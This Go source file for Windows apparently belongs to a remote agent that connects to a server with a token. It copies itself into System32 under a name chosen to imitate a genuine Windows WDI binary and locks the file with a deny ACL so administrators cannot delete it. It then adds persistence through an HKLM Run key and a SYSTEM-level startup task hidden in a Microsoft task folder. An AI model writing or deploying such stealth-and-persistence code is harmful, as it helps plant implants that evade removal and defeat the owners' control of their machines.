//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const (
	seFileObject = 1

	// File access rights to deny on the binary
	fileDelete          = 0x00010000 // DELETE
	fileWriteAttributes = 0x00000100 // FILE_WRITE_ATTRIBUTES
	writeDac            = 0x00040000 // WRITE_DAC   — prevents DACL changes
	writeOwner          = 0x00080000 // WRITE_OWNER — prevents ownership changes
)

var procSetNamedSecurityInfo = modAdvapi32.NewProc("SetNamedSecurityInfoW")

// deployBinary copies the running executable to %SystemRoot%\System32\<name>,
// applies a file DACL that blocks deletion and modification, and returns the
// protected path. On error it returns the original exe path so the caller can
// fall back gracefully.
func deployBinary(srcExe string) (string, error) {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	// Fixed name matches the real WDI service binary — blends with System32.
	dst := filepath.Join(sysRoot, "System32", "wdisystemhost.exe")

	data, err := os.ReadFile(srcExe)
	if err != nil {
		return srcExe, fmt.Errorf("read binary: %w", err)
	}
	if err := os.WriteFile(dst, data, 0755); err != nil {
		return srcExe, fmt.Errorf("write to System32: %w", err)
	}

	if err := applyFileDACL(dst); err != nil {
		// Non-fatal — binary is deployed even if DACL fails
		fmt.Printf("[!] File DACL: %v\n", err)
	}

	return dst, nil
}

// applyFileDACL sets a deny ACE on the file that blocks deletion,
// attribute writes, and DACL/owner modification for Everyone.
// This makes the file resistant to deletion even by local administrators —
// bypassing it requires taking ownership via privilege (auditable) or a kernel driver.
func applyFileDACL(path string) error {
	const sidBufSize = 256
	const aclBufSize = 1024

	sidBuf := make([]byte, sidBufSize)
	sz := uint32(sidBufSize)

	r, _, _ := procCreateWellKnownSid.Call(
		uintptr(winWorldSid),
		0,
		uintptr(unsafe.Pointer(&sidBuf[0])),
		uintptr(unsafe.Pointer(&sz)),
	)
	if r == 0 {
		return fmt.Errorf("CreateWellKnownSid: %w", syscall.GetLastError())
	}

	aclBuf := make([]byte, aclBufSize)
	r, _, _ = procInitializeAcl.Call(
		uintptr(unsafe.Pointer(&aclBuf[0])),
		uintptr(aclBufSize),
		uintptr(aclRevision),
	)
	if r == 0 {
		return fmt.Errorf("InitializeAcl: %w", syscall.GetLastError())
	}

	deny := uint32(fileDelete | fileWriteAttributes | writeDac | writeOwner)
	r, _, _ = procAddAccessDeniedAce.Call(
		uintptr(unsafe.Pointer(&aclBuf[0])),
		uintptr(aclRevision),
		uintptr(deny),
		uintptr(unsafe.Pointer(&sidBuf[0])),
	)
	if r == 0 {
		return fmt.Errorf("AddAccessDeniedAce: %w", syscall.GetLastError())
	}

	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	ret, _, _ := procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(seFileObject),
		uintptr(daclSecurityInformation),
		0, 0,
		uintptr(unsafe.Pointer(&aclBuf[0])),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("SetNamedSecurityInfo returned %d", ret)
	}
	return nil
}

// addRegistryPersistence writes an HKLM Run key so the agent starts on every
// user login as a fallback if the service is removed.
func addRegistryPersistence(exePath, server, token, id string) error {
	k, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return fmt.Errorf("open Run key: %w", err)
	}
	defer k.Close()

	cmd := fmt.Sprintf(`"%s" --server %q --token %q`, exePath, server, token)
	if id != "" {
		cmd += fmt.Sprintf(` --id %q`, id)
	}
	return k.SetStringValue(svcDisplay, cmd)
}

// removeRegistryPersistence deletes the HKLM Run key entry.
func removeRegistryPersistence() {
	k, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer k.Close()
	k.DeleteValue(svcDisplay)
}

// addScheduledTask creates a SYSTEM-level scheduled task that runs at every
// system startup — the strongest backup persistence mechanism available
// without a kernel driver.
func addScheduledTask(exePath, server, token, id string) error {
	taskName := `\Microsoft\Windows\WDI\` + svcName

	args := fmt.Sprintf(`"%s" --server %q --token %q`, exePath, server, token)
	if id != "" {
		args += fmt.Sprintf(` --id %q`, id)
	}

	return exec.Command("schtasks.exe",
		"/create",
		"/tn", taskName,
		"/tr", args,
		"/sc", "ONSTART",
		"/ru", "SYSTEM",
		"/f",
	).Run()
}

// removeScheduledTask deletes the backup scheduled task.
func removeScheduledTask() {
	exec.Command("schtasks.exe",
		"/delete",
		"/tn", `\Microsoft\Windows\WDI\`+svcName,
		"/f",
	).Run()
}

// clearFileDACL replaces the file DACL with an empty (allow-all) ACL so the
// file can be modified or deleted again. Called during --uninstall cleanup.
func clearFileDACL(path string) {
	aclBuf := make([]byte, 64)
	procInitializeAcl.Call(
		uintptr(unsafe.Pointer(&aclBuf[0])),
		uintptr(64),
		uintptr(aclRevision),
	)

	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(seFileObject),
		uintptr(daclSecurityInformation),
		0, 0,
		uintptr(unsafe.Pointer(&aclBuf[0])),
		0,
	)
}
